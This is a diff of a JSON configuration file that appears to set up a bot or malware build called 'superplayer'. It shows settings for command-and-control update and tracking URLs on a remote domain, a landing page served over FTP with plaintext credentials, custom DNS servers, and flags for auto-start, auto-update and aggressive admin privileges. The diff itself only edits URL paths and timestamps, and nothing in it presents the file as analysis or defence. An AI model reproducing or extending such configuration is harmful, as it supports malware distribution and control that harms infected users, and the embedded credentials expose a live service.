@@ -16,7 +16,7 @@
   ],
   "pack": {
     "packFolder": "/root/hephaestus_data/default/server/packs",
-    "packTemplateUrl": "http://tubepleasure.xyz/superplayer.cmd/pack/envelope",
+    "packTemplateUrl": "http://tubepleasure.xyz/pack/envelope",
     "items": []
   },
   "clone": {
@@ -25,17 +25,17 @@
     "profile": ""
   },
   "server": "default",
-  "alias": "tubepleasure.xyz/superplayer.cmd",
+  "alias": "tubepleasure.xyz",
   "landingAuto": true,
   "landingName": "superplayer",
   "landingFtp": "ftp://ftp:ftp123@tubepleasure.xyz/tubepleasure.xyz/",
   "primaryDns": "84.200.33.53",
   "secondaryDns": "84.200.33.53",
   "extraUpdate": false,
-  "updateUrl": "http://tubepleasure.xyz/superplayer.cmd/bot/update",
+  "updateUrl": "http://tubepleasure.xyz/bot/update",
   "track": true,
   "trackDesktop": false,
-  "trackUrl": "http://tubepleasure.xyz/superplayer.cmd/bot/upsert",
+  "trackUrl": "http://tubepleasure.xyz/bot/upsert",
   "autoStart": true,
   "autoUpdate": true,
   "aggressiveAdmin": true,
@@ -62,7 +62,7 @@
     "_operate_isAtWork": true,
     "_operation": "apply",
     "_operate_hasToWork": true,
-    "_operate_modifyTime": "09/09/2026 07:49:36",
-    "StatusLabel": " \u0424\u043E\u043D\u043E\u0432\u044B\u0439 \u043F\u0440\u043E\u0446\u0435\u0441\u0441 apply \u0441 09/09/2026 07:49:36"
+    "_operate_modifyTime": "09/09/2026 07:58:48",
+    "StatusLabel": " \u0424\u043E\u043D\u043E\u0432\u044B\u0439 \u043F\u0440\u043E\u0446\u0435\u0441\u0441 apply \u0441 09/09/2026 07:58:48"
   }
 }
